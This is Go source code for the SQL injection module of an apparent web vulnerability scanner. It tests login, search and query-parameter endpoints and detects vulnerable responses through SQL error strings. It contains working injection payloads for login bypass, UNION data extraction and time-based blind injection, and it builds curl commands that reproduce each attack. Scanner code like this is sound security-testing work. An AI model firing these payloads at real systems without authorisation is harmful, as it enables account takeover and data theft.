package probers

import (
	"context"
	"fmt"
	"net/url"
	"strings"

	"github.com/borntobeyours/ouroboros/pkg/types"
)

// SQLiProber tests for SQL injection vulnerabilities.
type SQLiProber struct{}

func (p *SQLiProber) Name() string { return "sqli" }

func (p *SQLiProber) Probe(ctx context.Context, target types.Target, endpoints []types.Endpoint) []types.Finding {
	cfg := NewProberConfig(target)
	if currentClassified != nil {
		cfg.Classified = currentClassified
	}
	var findings []types.Finding

	// 1. Test discovered login endpoints for SQLi bypass
	findings = append(findings, p.testLoginSQLi(cfg)...)

	// 2. Test discovered search endpoints for SQLi
	findings = append(findings, p.testSearchSQLi(cfg)...)

	// 3. Test all endpoints with query parameters
	findings = append(findings, p.testParameterSQLi(cfg, endpoints)...)

	return findings
}

func (p *SQLiProber) testLoginSQLi(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Get login endpoints from classifier
	var loginEndpoints []string
	if cfg.Classified != nil {
		for _, ep := range cfg.Classified.Login {
			loginEndpoints = append(loginEndpoints, ep.URL)
		}
	}

	// Error-based SQLi in login
	payloads := []struct {
		emailField string
		email      string
		desc       string
		subtype    string
	}{
		{"email", `' OR 1=1--`, "authentication bypass via OR 1=1", "error-based"},
		{"username", `' OR 1=1--`, "authentication bypass via OR 1=1", "error-based"},
		{"email", `admin'--`, "admin account bypass via comment injection", "error-based"},
		{"username", `admin'--`, "admin account bypass via comment injection", "error-based"},
		{"email", `' UNION SELECT * FROM users--`, "UNION-based SQLi in login", "union-based"},
	}

	for _, loginURL := range loginEndpoints {
		path := extractPath(loginURL)
		for _, pl := range payloads {
			body := fmt.Sprintf(`{"%s":"%s","password":"anything"}`, pl.emailField, pl.email)
			status, _, respBody, err := cfg.DoRequest("POST", loginURL,
				strings.NewReader(body), map[string]string{"Content-Type": "application/json"})
			if err != nil {
				continue
			}

			if status == 200 && strings.Contains(respBody, "token") {
				findings = append(findings, MakeFinding(
					fmt.Sprintf("SQL Injection - Login Bypass (%s)", pl.subtype),
					"Critical",
					fmt.Sprintf("The login endpoint is vulnerable to SQL injection allowing %s. Payload: %s", pl.desc, pl.email),
					path,
					"POST",
					"CWE-89",
					fmt.Sprintf(`curl -X POST %s -H "Content-Type: application/json" -d '%s'`, loginURL, body),
					fmt.Sprintf("HTTP %d - Response contains auth token: %s", status, truncate(respBody, 200)),
					"sqli",
					0,
				))
				return findings // One login bypass is sufficient
			} else if containsSQLError(respBody) {
				findings = append(findings, MakeFinding(
					fmt.Sprintf("SQL Injection - Error Disclosure in Login (%s)", pl.subtype),
					"High",
					fmt.Sprintf("The login endpoint leaks SQL error details when given malicious input: %s", pl.email),
					path,
					"POST",
					"CWE-89",
					fmt.Sprintf(`curl -X POST %s -H "Content-Type: application/json" -d '%s'`, loginURL, body),
					fmt.Sprintf("HTTP %d - SQL error in response: %s", status, truncate(respBody, 200)),
					"sqli",
					0,
				))
				return findings
			}
		}
	}

	return findings
}

func (p *SQLiProber) testSearchSQLi(cfg *ProberConfig) []types.Finding {
	var findings []types.Finding

	// Get search endpoints from classifier
	var searchEndpoints []types.Endpoint
	if cfg.Classified != nil {
		searchEndpoints = cfg.Classified.Search
	}

	payloads := []struct {
		query   string
		desc    string
		subtype string
	}{
		{`'))--`, "error-based SQLi via comment injection", "error-based"},
		{`' OR 1=1--`, "boolean-based blind SQLi", "boolean-blind"},
		{`')) OR 1=1--`, "SQLi with parenthesis bypass", "error-based"},
		{`'; WAITFOR DELAY '0:0:5'--`, "time-based blind SQLi attempt", "time-based"},
		{`' UNION SELECT NULL,NULL,NULL--`, "UNION column enumeration", "union-based"},
	}

	for _, ep := range searchEndpoints {
		path := extractPath(ep.URL)
		baseEndpoint := strings.Split(ep.URL, "?")[0]

		// Determine which param to inject into
		searchParams := []string{"q", "query", "search", "keyword", "term", "s", "filter"}
		paramToTest := ""
		for _, p := range ep.Parameters {
			for _, sp := range searchParams {
				if strings.EqualFold(p, sp) {
					paramToTest = p
					break
				}
			}
			if paramToTest != "" {
				break
			}
		}
		if paramToTest == "" && len(ep.Parameters) > 0 {
			paramToTest = ep.Parameters[0]
		}
		if paramToTest == "" {
			paramToTest = "q"
		}

		for _, pl := range payloads {
			encoded := url.QueryEscape(pl.query)
			fullURL := fmt.Sprintf("%s?%s=%s", baseEndpoint, paramToTest, encoded)
			status, _, respBody, err := cfg.DoRequest("GET", fullURL, nil, nil)
			if err != nil {
				continue
			}

			if containsSQLError(respBody) {
				findings = append(findings, MakeFinding(
					fmt.Sprintf("SQL Injection - Search Endpoint (%s)", pl.subtype),
					"High",
					fmt.Sprintf("The search endpoint is vulnerable to %s. SQL error details leaked.", pl.desc),
					path+"?"+paramToTest+"=",
					"GET",
					"CWE-89",
					fmt.Sprintf(`curl "%s"`, fullURL),
					fmt.Sprintf("HTTP %d - SQL error: %s", status, truncate(respBody, 300)),
					"sqli",
					0,
				))
				return findings
			} else if status == 200 && pl.subtype == "union-based" && strings.Contains(respBody, "data") {
				findings = append(findings, MakeFinding(
					"SQL Injection - UNION-based Data Extraction via Search",
					"Critical",
					"UNION SELECT injection in search endpoint allows data extraction.",
					path+"?"+paramToTest+"=",
					"GET",
					"CWE-89",
					fmt.Sprintf(`curl "%s"`, fullURL),
					fmt.Sprintf("HTTP %d - Data extracted: %s", status, truncate(respBody, 300)),
					"sqli",
					0,
				))
				return findings
			}
		}
	}

	return findings
}

func (p *SQLiProber) testParameterSQLi(cfg *ProberConfig, endpoints []types.Endpoint) []types.Finding {
	var findings []types.Finding
	tested := make(map[string]bool)

	sqlPayload := `' OR '1'='1`

	for _, ep := range endpoints {
		if len(ep.Parameters) == 0 {
			continue
		}
		path := extractPath(ep.URL)
		if tested[path] {
			continue
		}
		tested[path] = true

		// Skip endpoints we already test via classifier
		if ep.HasCategory(types.CatSearch) || ep.HasCategory(types.CatLogin) {
			continue
		}

		for _, param := range ep.Parameters {
			// Skip read-only parameters (ver, v, cache busters)
			if IsReadOnlyParam(param) {
				continue
			}
			// Skip static assets (JS/CSS files)
			if IsStaticAssetURL(ep.URL) {
				continue
			}
			testURL := fmt.Sprintf("%s?%s=%s", strings.Split(ep.URL, "?")[0], param, url.QueryEscape(sqlPayload))
			status, _, respBody, err := cfg.DoRequest("GET", testURL, nil, nil)
			if err != nil {
				continue
			}

			if containsSQLError(respBody) {
				findings = append(findings, MakeFinding(
					fmt.Sprintf("SQL Injection - Parameter '%s' at %s", param, path),
					"High",
					fmt.Sprintf("SQL error disclosure when injecting into parameter '%s'.", param),
					path,
					"GET",
					"CWE-89",
					fmt.Sprintf(`curl "%s"`, testURL),
					fmt.Sprintf("HTTP %d - SQL error: %s", status, truncate(respBody, 200)),
					"sqli",
					0,
				))
			}
		}
	}

	return findings
}

// containsSQLError checks if a response body contains SQL error indicators.
func containsSQLError(body string) bool {
	lower := strings.ToLower(body)
	sqlErrors := []string{"sql", "sqlite", "sequelize", "syntax error", "mysql",
		"postgresql", "ora-", "microsoft sql", "unrecognized token",
		"sqlstate", "jdbc", "odbc"}
	for _, se := range sqlErrors {
		if strings.Contains(lower, se) {
			return true
		}
	}
	return false
}
